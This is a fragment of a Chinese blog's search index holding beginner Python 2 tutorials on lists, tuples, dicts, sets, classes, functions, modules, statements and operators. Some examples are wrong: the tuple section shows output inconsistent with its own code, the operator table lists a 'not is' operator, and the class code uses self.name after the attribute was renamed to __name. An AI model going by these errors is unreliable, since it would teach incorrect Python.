href="#末尾追加" class="headerlink" title="末尾追加"></a>末尾追加</h3><ol><li><code>&gt;&gt;&gt; game.append(&quot;wow&quot;)</code></li><li><code>&gt;&gt;&gt; game[3]</code></li><li><code>&#39;wow&#39;</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota&#39;, &#39;dota2&#39;, &#39;lol&#39;, &#39;wow&#39;]</code></li></ol><h3 id="指定位置插入"><a href="#指定位置插入" class="headerlink" title="指定位置插入"></a>指定位置插入</h3><ol><li><code>&gt;&gt;&gt; game.insert(2, &quot;war3&quot;)</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota&#39;, &#39;dota2&#39;, &#39;war3&#39;, &#39;lol&#39;, &#39;wow&#39;]</code></li></ol><h2 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h2><h3 id="删除末尾的元素"><a href="#删除末尾的元素" class="headerlink" title="删除末尾的元素"></a>删除末尾的元素</h3><ol><li><code>&gt;&gt;&gt; game.pop()</code></li><li><code>&#39;wow&#39;</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota&#39;, &#39;dota2&#39;, &#39;war3&#39;, &#39;lol&#39;]</code></li></ol><h3 id="删除指定位置元素"><a href="#删除指定位置元素" class="headerlink" title="删除指定位置元素"></a>删除指定位置元素</h3><ol><li><code>&gt;&gt;&gt; game.pop(1)</code></li><li><code>&#39;dota2&#39;</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota&#39;, &#39;war3&#39;, &#39;lol&#39;]</code></li></ol><h1 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h1><ul><li>python内置的一种数据结构</li><li>有序</li><li>不可更改</li><li>在赋值的时候决定所有元素</li></ul><h2 id="声明-1"><a href="#声明-1" class="headerlink" title="声明"></a>声明</h2><ol><li><code>&gt;&gt;&gt; game = (&#39;dota&#39;, &#39;war3&#39;, &#39;lol&#39;)</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>(&#39;dota&#39;, &#39;war3&#39;, &#39;lol&#39;)</code></li></ol><h2 id="获取长度"><a href="#获取长度" class="headerlink" title="获取长度"></a>获取长度</h2><ol><li><code>&gt;&gt;&gt; len(game)</code></li><li><code>3</code></li></ol><h2 id="获取元素-1"><a href="#获取元素-1" class="headerlink" title="获取元素"></a>获取元素</h2><ol><li><code>&gt;&gt;&gt; game[0]</code></li><li><code>&#39;dota&#39;</code></li><li><code>&gt;&gt;&gt; game[1]</code></li><li><code>&#39;dota2&#39;</code></li><li><code>&gt;&gt;&gt; game[2]</code></li><li><code>&#39;lol&#39;</code></li><li><code>&gt;&gt;&gt; game[3]</code></li><li><code>Traceback (most recent call last):</code></li><li><code>File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</code></li><li><code>IndexError: list index out of range</code></li><li><code>&gt;&gt;&gt;</code></li></ol><p>如果下标越界会报错</p><h1 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h1><ul><li>python内置的一种数据结构</li><li>无序</li><li>可更改</li></ul><p>类似于C++语言的map，存键值对，有很快的查找速度。比如根据身份证号查找某个人的名字，根据学号查找学生成绩单。用list遍历也可以得到结果，但是太慢了，list就好像你在一个小区找人，你一家一家敲门。dict就好像你直接按照地址X栋X单元X层直接找。 dict是典型的用空间换时间的例子。会占用大量内存，但是查找、插入速度很快，不会随着元素数量增加而增加。 list则是时间换空间的例子，不会占用大量内存，但是随着元素数量增多，查找时间会变很长。</p><h2 id="声明-2"><a href="#声明-2" class="headerlink" title="声明"></a>声明</h2><ol><li><code>&gt;&gt;&gt;name = &#123;1: &quot;alan&quot;, 2: &quot;bob&quot;, 3: &quot;lucy&quot;&#125;</code></li></ol><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ol><li><code>&gt;&gt;&gt;name[1]</code></li><li><code>&#39;alan&#39;</code></li><li><code>&gt;&gt;&gt;name[2]</code></li><li><code>&#39;bob&#39;</code></li><li><code>&gt;&gt;&gt;name[3]</code></li><li><code>&#39;lucy&#39;</code></li><li><code>&gt;&gt;&gt; name[5]</code></li><li><code>Traceback (most recent call last):</code></li><li><code>File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</code></li><li><code>KeyError: 5</code></li></ol><p>为了避免出现报错的情况我们一般事先判断一下这个key是否在字典中</p><ol><li><code>&gt;&gt;&gt; 5 in name</code></li><li><code>False</code></li></ol><p>也可以用get方法取，如果key不存在，会返回None或者自己定义的默认值</p><ol><li><code>&gt;&gt;&gt; name.get(5)</code></li><li><code>&gt;&gt;&gt; name.get(5, &quot;default&quot;)</code></li><li><code>&#39;default&#39;</code></li></ol><h2 id="更改-1"><a href="#更改-1" class="headerlink" title="更改"></a>更改</h2><ol><li><code>&gt;&gt;&gt; name[4] = &quot;mac&quot;</code></li><li><code>&gt;&gt;&gt; name</code></li><li><code>&#123;1: &quot;alan&quot;, 2: &quot;bob&quot;, 3: &quot;lucy&quot;, 4: &quot;mac&quot;&#125;</code></li></ol><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><ol><li><code>&gt;&gt;&gt; name.pop(1)</code></li><li><code>&#39;alan&#39;</code></li><li><code>&gt;&gt;&gt; name</code></li><li><code>&#123;2: &#39;bob&#39;, 3: &#39;lucy&#39;&#125;</code></li></ol><h2 id="元素个数"><a href="#元素个数" class="headerlink" title="元素个数"></a>元素个数</h2><ol><li><code>&gt;&gt;&gt; len(name)</code></li><li><code>2</code></li></ol><h2 id="获取所有key"><a href="#获取所有key" class="headerlink" title="获取所有key"></a>获取所有key</h2><ol><li><code>&gt;&gt;&gt; name.keys()</code></li><li><code>[2, 3]</code></li></ol><h2 id="获取所有value"><a href="#获取所有value" class="headerlink" title="获取所有value"></a>获取所有value</h2><ol><li><code>&gt;&gt;&gt; name.values()</code></li><li><code>[&#39;bob&#39;, &#39;lucy&#39;]</code></li></ol><h2 id="获取所有键值对"><a href="#获取所有键值对" class="headerlink" title="获取所有键值对"></a>获取所有键值对</h2><ol><li><code>&gt;&gt;&gt; name.items()</code></li><li><code>[(2, &#39;bob&#39;), (3, &#39;lucy&#39;)]</code></li></ol><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><ul><li>python内置数据结构</li><li>无序</li><li>可更改</li></ul><p>set可以视为没有value的dict，只存key，一般用做去重或者集合求交、求并等。</p><h2 id="声明-3"><a href="#声明-3" class="headerlink" title="声明"></a>声明</h2><ol><li><code>&gt;&gt;&gt; girls_1 = set([&#39;lucy&#39;, &#39;lily&#39;])</code></li><li><code>&gt;&gt;&gt; girls_2 = set([&#39;lily&#39;, &#39;anna&#39;])</code></li></ol><h2 id="求并、交"><a href="#求并、交" class="headerlink" title="求并、交"></a>求并、交</h2><ol><li><code>&gt;&gt;&gt; girls_1 &amp; girls_2</code></li><li><code>set([&#39;lily&#39;])</code></li><li><code>&gt;&gt;&gt; girls_1 | girls_2</code></li><li><code>set([&#39;lily&#39;, &#39;lucy&#39;, &#39;anna&#39;])</code></li></ol><h2 id="增加元素-1"><a href="#增加元素-1" class="headerlink" title="增加元素"></a>增加元素</h2><ol><li><code>&gt;&gt;&gt; girls_1.add(&#39;marry&#39;)</code></li><li><code>&gt;&gt;&gt; girls_1</code></li><li><code>set([&#39;marry&#39;, &#39;lily&#39;, &#39;lucy&#39;])</code></li></ol><h2 id="删除元素-1"><a href="#删除元素-1" class="headerlink" title="删除元素"></a>删除元素</h2><ol><li><code>&gt;&gt;&gt; girls_1.remove(&#39;lucy&#39;)</code></li><li><code>&gt;&gt;&gt; girls_1</code></li><li><code>set([&#39;marry&#39;, &#39;lily&#39;])</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 类</title>
      <link href="67860e19ddc0/"/>
      <url>67860e19ddc0/</url>
      
        <content type="html"><![CDATA[<h1 id="python类"><a href="#python类" class="headerlink" title="python类"></a>python类</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>面向对象是我们经常能听到的术语，即class，类。事实上，主角是两个，一个是类，一个是类实例。人类，是一个类，我们每一个人是一个人类的实例。而类之间又有一些关系，例如，我们既是人类，也是动物，更细化来讲，我们是哺乳类动物，灵长类，类似于集合的概念，哺乳动物属于动物，而在面向对象中我们通常称哺乳动物是动物的子类。而对于动物这个类来说，会自带一些属性，例如：年龄、体重。也会有一些方法：生殖、呼吸。而不同种类的动物（即动物类的各种子类）可能会有不同的属性或方法，像胎生、卵生，像鸟类的飞行的方法和豹子奔跑的方法。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>用关键字class去定义一个类，如果没有指定父类，默认继承object类。</p><ol><li><code>class Human(object):</code></li><li><code>pass</code></li></ol><p>这样，我们定义个了一个Human，人类。</p><h2 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h2><ol><li><code>class Human(object):</code></li><li><code>taisheng = True</code></li></ol><p>为什么要叫类属性呢，因为这个属性是和类绑定的，并不是和实例绑定的。胎生这个属性是全人类共有的，并不是某个人特殊拥有的属性。</p><h2 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h2><ol><li><p><code>class Human(object):</code></p></li><li><p><code>def __init__(self, name):</code></p></li><li><p><code>self.name = name</code></p></li><li><p><code>human_a = Human(&quot;alan&quot;)</code></p></li></ol><p>我们首先实例化了一个人类human_a，然后给这个人类设置了一个实例属性name，name这个属性独立于其他的人类，是和实例绑定的，所以叫实例属性。</p><ul><li>实例属性可以在实例创建后任意时间设置。</li><li>一般放在构造函数里__init()__</li></ul><h2 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h2><ol><li><code>class Human(object):</code></li><li><code>def __init__(self, name):</code></li><li><code>self.name = name</code></li><li><code>def walk(self):</code></li><li><code>print self.name + &quot; is walking&quot;</code></li><li><code>human_a = Human(&quot;alan&quot;)</code></li><li><code>human_a.walk()</code></li></ol><p>运行结果：</p><ol><li><code>alan is walking</code></li></ol><p>类的方法可以看做是一种类属性，而传入的第一个参数self，表示调用这个类方法的实例。像上面的例子，human_a调用了walk这个类方法，human_a的名字是alan，所以运行的结果就是alan is walking。</p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>从上面的例子来看，我们可以在外部随意更改name这个属性，如果不想让外部直接访问到，则在属性名字前加两个下划线__name，这样从外部就无法直接访问了。如果还是想访问，可以再加个get的接口。</p><ol><li><code>class Human(object):</code></li><li><code>def __init__(self, name):</code></li><li><code>self.__name = name</code></li><li><code>def walk(self):</code></li><li><code>print self.name + &quot; is walking&quot;</code></li><li><code>def get_name(self):</code></li><li><code>return self.__name</code></li><li><code>human_a = Human(&quot;alan&quot;)</code></li><li><code>print human_a.get_name()</code></li><li><code>print human_a.__name</code></li></ol><p>如果还是想更改__name字段，可以再加上一个set接口</p><ol><li><code>class Human(object):</code></li><li><code>def __init__(self, name):</code></li><li><code>self.__name = name</code></li><li><code>def walk(self):</code></li><li><code>print self.name + &quot; is walking&quot;</code></li><li><code>def get_name(self):</code></li><li><code>return self.__name</code></li><li><code>def set_name(self, name):</code></li><li><code>self.__name = name</code></li><li><code>human_a = Human(&quot;alan&quot;)</code></li><li><code>print human_a.set_name(&quot;bob&quot;)</code></li></ol><p>可能有人会有疑问，为何要这么“画蛇添足”呢？其不然，这样会增强代码的健壮性，直接暴漏属性可能会带来意想不到的后果，通过接口的方式可以加以控制，例如，我们可以通过set接口去限定name的长度。</p><ol><li><code>class Human(object):</code></li><li><code>def __init__(self, name):</code></li><li><code>self.__name = name</code></li><li><code>def walk(self):</code></li><li><code>print self.name + &quot; is walking&quot;</code></li><li><code>def get_name(self):</code></li><li><code>return self.__name</code></li><li><code>def set_name(self, name):</code></li><li><code>if len(name) &lt;= 10:</code></li><li><code>self.__name = name</code></li><li><code>human_a = Human(&quot;alan&quot;)</code></li><li><code>print human_a.set_name(&quot;bob&quot;)</code></li></ol><p>这样就不会出现name过长的情况。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>最开始的简介里说到，哺乳动物是动物的一种，用面向对象的属于来说，哺乳动物是动物的子类，子类拥有父类的属性、方法，即继承。同时又可以拥有父类没有的属性和方法，即多态。 还是以人类为例，通常来说，人类又可以分为男人和女人（当然也有别的，23333）</p><ol><li><code>class Man(Human):</code></li><li><code>def __init__(self, name, has_wife):</code></li><li><code>self.__name = name</code></li><li><code>self.__has_wife = has_wife</code></li></ol><p>来，我们看下这个男人，多了一个新的属性，__has_wife(是否已婚)。我们写到了Man的构造函数里。其实通常并不这么写构造函数，假如Human里有很多属性、很多初始化步骤，我们Man继承的时候难不成要复制粘贴一遍Human的构造函数？当然不是啦，通常会这么写。</p><ol><li><code>class Man(Human):</code></li><li><code>def __init__(self, name, has_wife):</code></li><li><code>super(Man, self).__init__(name)</code></li><li><code>self.__has_wife = has_wife</code></li></ol><p>super(Man, self).__init__(name)等价于调用了父类Human的构造函数，就不用再复制粘贴一遍了。 既然有男人，那就再来个女人吧。</p><ol><li><code>class Woman(Human):</code></li><li><code>def __init__(self, name, has_husband):</code></li><li><code>super(Woman, self).__init__(name)</code></li><li><code>self.__has_husband = has_husband</code></li></ol><p>我们都道，男人和女人是不一样的，通常男人都自带抽烟、喝酒、烫头，啊。。。并没有烫头。</p><ol><li><code>class Man(Human):</code></li><li><code>def __init__(self, name, has_husband):</code></li><li><code>super(Man, self).__init__(name)</code></li><li><code>self.__has_husband = has_husband</code></li><li><code>def smoke(self):</code></li><li><code>print &quot;A man maybe smoke&quot;</code></li><li><code>def drink(self):</code></li><li><code>print &quot;A man maybe drink&quot;</code></li></ol><p>当然，女人也自带逛街、化妆等天赋技能。</p><ol><li><code>class Woman(Human):</code></li><li><code>def __init__(self, name, has_husband):</code></li><li><code>super(Woman, self).__init__(name)</code></li><li><code>self.__has_husband = has_husband</code></li><li><code>def shopping(self):</code></li><li><code>print &quot;A woman always go shopping&quot;</code></li><li><code>def make_up(self):</code></li><li><code>print &quot;A woman always make up&quot;</code></li></ol><p>好了，观众朋友们，有没有感觉到这种继承的优越性。可以很清晰地看到，男人和女人都有一些相同的属性，也有一些各自不同的方法。如果哪天人类有了别的方法、属性，直接在Human类更改，男人和女人也会自动继承。如果想再设计一个双性人这个类，那直接从Human继承就可以了，对男人和女人不会有任何影响。这就是面向对象的优越性啊！</p>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python函数</title>
      <link href="80bb8c302883/"/>
      <url>80bb8c302883/</url>
      
        <content type="html"><![CDATA[<p>函数是可重复调用的代码段，能提高代码的复用率。</p><h2 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h2><ol><li><p><code>#!/usr/bin/env python</code></p></li><li><p><code># -*- coding: utf-8 -*-</code></p></li><li><p><code># 无参数</code></p></li><li><p><code>def print_hello():</code></p></li><li><p><code>print &quot;hello&quot;</code></p></li><li><p><code>print_hello()</code></p></li><li><p><code># 带参数</code></p></li><li><p><code>def print_str(s):</code></p></li><li><p><code>print s</code></p></li><li><p><code>return s * 2</code></p></li><li><p><code>print_str(&quot;fuck&quot;)</code></p></li><li><p><code># 带默认参数</code></p></li><li><p><code>def print_default(s=&quot;hello&quot;):</code></p></li><li><p><code>print s</code></p></li><li><p><code>print_default()</code></p></li><li><p><code>print_default(&quot;default&quot;)</code></p></li><li><p><code># 不定长参数</code></p></li><li><p><code>def print_args(s, *arg):</code></p></li><li><p><code>print s</code></p></li><li><p><code>for a in arg:</code></p></li><li><p><code>print a</code></p></li><li><p><code>return</code></p></li><li><p><code>print_args(&quot;hello&quot;)</code></p></li><li><p><code>print_args(&quot;hello&quot;, &quot;world&quot;, &quot;1&quot;)</code></p></li><li><p><code># 参数次序可以变</code></p></li><li><p><code>def print_two(a, b):</code></p></li><li><p><code>print a,b</code></p></li><li><p><code>print_two(a=&quot;a&quot;, b=&quot;b&quot;)</code></p></li><li><p><code>print_two(b=&quot;b&quot;, a=&quot;a&quot;)</code></p></li></ol><p>输出结果：</p><ol><li><code>hello</code></li><li><code>fuck</code></li><li><code>hello</code></li><li><code>default</code></li><li><code>hello</code></li><li><code>hello</code></li><li><code>world</code></li><li><code>1</code></li><li><code>a b</code></li><li><code>a b</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python变量</title>
      <link href="88829ca90023/"/>
      <url>88829ca90023/</url>
      
        <content type="html"><![CDATA[<h1 id="python变量"><a href="#python变量" class="headerlink" title="python变量"></a>python变量</h1><ol><li>python不用事先声明变量，赋值过程中就包含了变量声明和定义的过程</li><li>用“=”赋值，左边是变量名，右边是变量的值</li></ol><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ol><li><p><code>#!/usr/bin/python</code></p></li><li><p><code># -*- coding: UTF-8 -*-</code></p></li><li><p><code>str = &#39;Hello World!&#39;</code></p></li><li><p><code>print str # 输出完整字符串</code></p></li><li><p><code>print str[0] # 输出字符串中的第一个字符</code></p></li><li><p><code>print str[2:5] # 输出字符串中第三个至第五个之间的字符串</code></p></li><li><p><code>print str[2:] # 输出从第三个字符开始的字符串</code></p></li><li><p><code>print str * 2 # 输出字符串两次</code></p></li><li><p><code>print str + &quot;TEST&quot; # 输出连接的字符串</code></p></li></ol><p>运行以上代码的结果：</p><ol><li><code>Hello World!</code></li><li><code>H</code></li><li><code>llo</code></li><li><code>llo World!</code></li><li><code>Hello World!Hello World!</code></li><li><code>Hello World!TEST</code></li></ol><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>类似于C++或Java语言的数组，一个有序可变集合的容器。支持内置的基础数据结构甚至是列表，列表是可以嵌套的。不同的数据结构也可以放在同一个列表中，没有统一类型的限制。</p><ol><li><p><code>#!/usr/bin/python</code></p></li><li><p><code># -*- coding: UTF-8 -*-</code></p></li><li><p><code>list_a = [&quot;str&quot;, 1, [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;], 4]</code></p></li><li><p><code>list_b = [&quot;hello&quot;]</code></p></li><li><p><code>print list_a[0]</code></p></li><li><p><code>print list_a[1:3]</code></p></li><li><p><code>print list_a[1:]</code></p></li><li><p><code>print list_b * 2</code></p></li><li><p><code>print list_a + list_b</code></p></li></ol><p>运行以上代码：</p><ol><li><code>str</code></li><li><code>[1, [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]]</code></li><li><code>[1, [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;], 4]</code></li><li><code>[&#39;hello&#39;, &#39;hello&#39;]</code></li><li><code>[&#39;str&#39;, 1, [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;], 4, &#39;hello&#39;]</code></li></ol><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>可以视为不可变的列表，在赋值之后就不能二次更改了。</p><ol><li><p><code>#!/usr/bin/python</code></p></li><li><p><code># -*- coding: UTF-8 -*-</code></p></li><li><p><code>tuple_a = (&quot;str&quot;, 1, [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;], 4)</code></p></li><li><p><code>tuple_b = (&quot;hello&quot;,)</code></p></li><li><p><code>print tuple_a[0]</code></p></li><li><p><code>print tuple_a[1:3]</code></p></li><li><p><code>print tuple_a[1:]</code></p></li><li><p><code>print tuple_b * 2</code></p></li><li><p><code>print tuple_a + tuple_b</code></p></li></ol><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>类似于C++语言的map，key-value键值对的集合，无序的容器。</p><ol><li><p><code>#!/usr/bin/python</code></p></li><li><p><code># -*- coding: UTF-8 -*-</code></p></li><li><p><code>dict_a = &#123;</code></p></li><li><p><code>&quot;name&quot;: &quot;Alan&quot;,</code></p></li><li><p><code>&quot;age&quot;: 24,</code></p></li><li><p><code>1: &quot;level_1&quot;</code></p></li><li><p><code>&#125;</code></p></li><li><p><code>print dict_a[&quot;name&quot;]</code></p></li><li><p><code>print dict_a[&quot;age&quot;]</code></p></li><li><p><code>print dict_a[1]</code></p></li><li><p><code>print &quot;name&quot; in dict_a</code></p></li><li><p><code>print &quot;xxx&quot; in dict_a</code></p></li><li><p><code>print dict_a.keys()</code></p></li><li><p><code>print dict_a.values()</code></p></li><li><p><code>print dict_a.items()</code></p></li></ol><p>运行以上代码：</p><ol><li><code>Alan</code></li><li><code>24</code></li><li><code>level_1</code></li><li><code>True</code></li><li><code>False</code></li><li><code>[1, &#39;age&#39;, &#39;name&#39;]</code></li><li><code>[&#39;level_1&#39;, 24, &#39;Alan&#39;]</code></li><li><code>[(1, &#39;level_1&#39;), (&#39;age&#39;, 24), (&#39;name&#39;, &#39;Alan&#39;)]</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python模块</title>
      <link href="934ca7d9a244/"/>
      <url>934ca7d9a244/</url>
      
        <content type="html"><![CDATA[<p>通常来说，比较正规的工程不会把所有代码放在一个py文件里，我们会把代码拆成各个模块，分别调用。对python来说，拆成各个模块可以看做拆成各个py文件。</p><h2 id="搜索路径"><a href="#搜索路径" class="headerlink" title="搜索路径"></a>搜索路径</h2><p>通常来说，同文夹下的py文件可以直接导入。</p><ol><li><code>def print_hello():</code></li><li><code>print &quot;hello&quot;</code></li></ol><p>我们把这个保存至hello.py</p><ol><li><code>import hello</code></li><li><code>hello.print_hello()</code></li></ol><p>在run.py里导入，然后调用print_hello（） 目录结构</p><ol><li><code>...../</code></li><li><code>hello.py</code></li><li><code>run.py</code></li></ol><p>hello.py和run.py在同一目录下，可以直接导入 如果在不同路径下，可以在sys.path里手动加入你想导入的路径</p><ol><li><code>import sys</code></li><li><code>sys.path.append(&#39;/home/zhuzekun/course&#39;)</code></li><li><code>import hello</code></li><li><code>hello.print_hello()</code></li></ol><p>如果run.py不在/ home / zhuzekun / course文件夹下，手动加入这个路径，就可以导入这个路径下的hello.py</p><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><p>通常一个工程不可能只有一层目录结构，并且也不会一个一个路径去追加到SYS里，常用的做法是包，一个目录及其子目录组成的一个包（可以看做一个库）。 举个例子</p><ol><li><code>/home/zhuzekun/course</code></li><li><code>├── __init__.py</code></li><li><code>├── __init__.pyc</code></li><li><code>├── m1</code></li><li><code>│ ├── b.py</code></li><li><code>│ ├── b.pyc</code></li><li><code>│ ├── __init__.py</code></li><li><code>│ ├── __init__.pyc</code></li><li><code>│ └── m1_1</code></li><li><code>│ ├── a.py</code></li><li><code>│ ├── a.pyc</code></li><li><code>│ ├── __init__.py</code></li><li><code>│ └── __init__.pyc</code></li><li><code>└── m2</code></li><li><code>├── __init__.py</code></li><li><code>└── run.py</code></li></ol><p>这是一个课程文件夹，里面有m1和m2这两个文件夹，同时m1中又有一个子文件夹m1_1。 文件b.py</p><ol><li><code>def hello_b():</code></li><li><code>print &quot;hello b&quot;</code></li></ol><p>文件a.py</p><ol><li><code>def hello_a():</code></li><li><code>print &quot;hello a&quot;</code></li></ol><p>文件run.py</p><ol><li><p><code>import sys</code></p></li><li><p><code>import os</code></p></li><li><p><code>sys.path.append(&#39;/home/zhuzekun/&#39;)</code></p></li><li><p><code>from course.m1 import b</code></p></li><li><p><code>from course.m1.m1_1 import a</code></p></li><li><p><code>if __name__ == &#39;__main__&#39;:</code></p></li><li><p><code>b.hello_b()</code></p></li><li><p><code>a.hello_a()</code></p></li></ol><p>在run.py中要调用m1 / b.py和m1 / m1_1 / a.py，只需要导入课程这个包就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python语句</title>
      <link href="703246a6c5a4/"/>
      <url>703246a6c5a4/</url>
      
        <content type="html"><![CDATA[<h1 id="python语句"><a href="#python语句" class="headerlink" title="python语句"></a>python语句</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><ol><li><code>if 条件:</code></li><li><code>满足条件执行的语句</code></li><li><code>else:</code></li><li><code>不满足条件执行的语句</code></li></ol><p>例如</p><ol><li><code>a = 2</code></li><li><code>if a == 1:</code></li><li><code>print &quot;a == 1&quot;</code></li><li><code>elif a == 2:</code></li><li><code>print &quot;a == 2&quot;</code></li><li><code>else:</code></li><li><code>print &quot;a != 1 and a != 2&quot;</code></li></ol><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>用来遍历容器、或者执行重复性的代码。</p><h3 id="遍历容器"><a href="#遍历容器" class="headerlink" title="遍历容器"></a>遍历容器</h3><ol><li><code>list_a = [1, 2, &quot;test&quot;]</code></li><li><code>for i in list_a:</code></li><li><code>print i</code></li></ol><p>运行结果</p><ol><li><code>1</code></li><li><code>2</code></li><li><code>test</code></li></ol><h3 id="执行重复性代码"><a href="#执行重复性代码" class="headerlink" title="执行重复性代码"></a>执行重复性代码</h3><ol><li><code>for i in range(0, 10):</code></li><li><code>print i</code></li></ol><p>运行结果</p><ol><li><code>0</code></li><li><code>1</code></li><li><code>2</code></li><li><code>3</code></li><li><code>4</code></li><li><code>5</code></li><li><code>6</code></li><li><code>7</code></li><li><code>8</code></li><li><code>9</code></li></ol><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><p>用来执行重复的代码</p><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>终止当前的循环</p><h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><p>继续当前的循环</p>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python运算符</title>
      <link href="a82568c81549/"/>
      <url>a82568c81549/</url>
      
        <content type="html"><![CDATA[<h1 id="python运算符"><a href="#python运算符" class="headerlink" title="python运算符"></a>python运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>相加</td></tr><tr><td>-</td><td>相减</td></tr><tr><td>*</td><td>相乘</td></tr><tr><td>/</td><td>相除</td></tr><tr><td>%</td><td>取模</td></tr><tr><td>**</td><td>幂</td></tr><tr><td>//</td><td>整除</td></tr></tbody></table><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>等于</td></tr><tr><td>!=</td><td>不等于</td></tr><tr><td>&lt;&gt;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;=</td><td>大于或等于</td></tr><tr><td>&lt;=</td><td>小于或等于</td></tr></tbody></table><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>赋值</td></tr><tr><td>+=</td><td>a += b 等价于 a = a + b</td></tr><tr><td>-=</td><td>a -= b 等价于 a = a - b</td></tr><tr><td>*=</td><td>a *= b 等价于 a = a * b</td></tr><tr><td>/=</td><td>a /= b 等价于 a = a / b</td></tr><tr><td>%=</td><td>a %= b 等价于 a = a % b</td></tr><tr><td>**=</td><td>a **= b 等价于 a = a ** b</td></tr><tr><td>//=</td><td>a //= b 等价于 a = a // b</td></tr></tbody></table><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>and</td><td>与关系，类似于C++的&amp;&amp;</td></tr><tr><td>or</td><td>或关系，类似于C++的</td></tr><tr><td>not</td><td>非，类似于C++的!</td></tr></tbody></table><h2 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>in</td><td>在指定容器中找到返回True，否则返回False</td></tr><tr><td>not in</td><td>在指定容器中未找到返回True，否则返回False</td></tr></tbody></table><h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>is</td><td>两个变量引用自同一个对象则返回True</td></tr><tr><td>not is</td><td>两个变量不是引用自同一个对象返回True</td></tr></tbody></table><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>与运算</td></tr><tr><td></td><td></td></tr><tr><td>^</td><td>异或运算</td></tr><tr><td>~</td><td>取反运算</td></tr><tr><td>&lt;&lt;</td><td>左移运算</td></tr><tr><td>&gt;&gt;</td><td>右移运算</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python入门 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 5.6.35编译安装</title>
      <link href="35c2cc8d8044/"/>
      <url>35c2cc8d8044/</url>
      
